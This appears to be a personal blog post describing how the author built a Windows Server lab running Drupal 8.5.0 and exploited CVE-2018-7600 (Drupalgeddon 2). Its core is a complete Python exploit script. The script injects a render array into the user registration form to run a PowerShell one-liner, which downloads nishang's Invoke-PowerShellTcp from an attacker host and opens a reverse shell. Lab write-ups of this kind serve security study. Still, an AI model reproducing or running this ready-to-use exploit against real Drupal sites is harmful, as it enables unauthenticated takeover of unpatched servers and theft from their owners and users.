---
layout: post
title: Exploiting Durpalgeddon 2 on Windows
tags: [Security, Hacking]
---
In late March of this year the Drupalgeddon 2 vulnerability was disclosed. Given the CVE 2018-7600 the vulnerability was an unauthenticated remote code execution flaw in Drupal instances covering versions < 7.58 / 8.x < 8.3.9 / 8.4.x < 8.4.6 / 8.5.x < 8.5.1. So basically every Drupal instance at the time and with around a million websites online running Drupal this flaw is huge. 

In simple terms, the vulnerability is an error in the way that Drupal processes AJAX form requests with the use of rendered arrays. Essentially a malicious rendered array is injected into a form that can be accessed by an unauthenticated user. The most common and vulnerable form that accepts malicious rendered arrays is the user registration form. For more on the technical details of the vulnerability and how it works vist [this site](https://research.checkpoint.com/uncovering-drupalgeddon-2/) by checkpoint research for details.

There are a few proof of concepts floating around on the internet such as [this one](https://github.com/dreadlocked/Drupalgeddon2) written in ruby, as well as a [metasploit module](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2), but they all seemed to target Linux. I was curious if this flaw could be exploit on Windows - so I built a lab to test it out. 

## Building the lab
I built my Drupal lab using Drupal 8.50 (released 7 March 2018), so this release is just before CVE 2018-7600 landed. I utilised Windows Server 2012 R2 as the server. The overall process for getting Drupal to run on Windows is a bit tricky, however [this website](https://www.xenyo.com/blog/drupal-8-on-windows-iis-mssql-and-php) does a fantastic job of walking you through all the little steps. The only additional things I needed to do to get it running are detailed below:

### PHP Manager
I was unable to get PHP Manager installed following the directions on the xenyo and there were certificate errors using Web Platform Installer 5.0. However, downloading and installing PHP Manager from this [GitHub repository](https://github.com/RonaldCarter/PHPManager/releases) did the trick.

### Open Drupal to External Connections
Once I was up and running with my Drupal instance, I could easily access it via localhost on the Windows Server. However, I was having issues connecting to it via my attacking Kali machine. The trick is in the settings.php file. The original file will have something like this located near the end of the file:
{% highlight bash %}
$settings['trusted_host_patterns'] = array(
    '^localhost$',
);
{% endhighlight %}
You need to add your server's IP address to this array to allow you to access your Drupal instance externally. So mine looks like:
{% highlight bash %}
$settings['trusted_host_patterns'] = array(
    '^localhost$','^192.168.206.129$'
);
{% endhighlight %}

## Exploiting CVE 2018-7600
The first step is determining if your Drupal instance is vulnerable. This means you need to identify the version number of the installation. I tried a number of tools including droopescan and drupwn, but these gave me differing results.
![](/img/drupal/droopescan.png)
![](/img/drupal/drupwn.png)
In the end, the most reliable response I got was from my nmap scan.
![](/img/drupal/nmap.png)
However, in a production environment this header may be removed, so you can get additional information from accessing the README.txt or LICENSE.txt files (again, this should probably be removed in production).

I crafted my exploit in python and set my commands to download nishang's Invoke-PowerShellTCP script to get a reverse shell on the box. My exploit that I ran was:
{% highlight python %}
#!/usr/bin/ python3
import sys
import requests

#######################################################
# Simple Exploit for CVE 2018-7600 (Drupalgeddon 2)
# Usage: python3 drupalgeddon.py http://target-address
#######################################################

target = sys.argv[1]

command = '''powershell -c IEX (New-Object Net.WebClient).downloadstring('http://192.168.206.133:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.206.133 -Port 8081'''

url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }

print("Sending Payload...")

r = requests.post(url, data=payload)

print("Payload Sent.")
{% endhighlight %}

I simply executed my payload.
![](/img/drupal/payload.png)
And got a reverse shell.
![](/img/drupal/shell.png)

So, in the end there is no difference for Windows or Linux when executing Drupalgeddon 2. You just need to use the specific commands for your target. The shocking thing about Drupalgeddon 2 is how easy it is to exploit. My exploit is not complex and once it was written it was a simple case of point and shoot. 
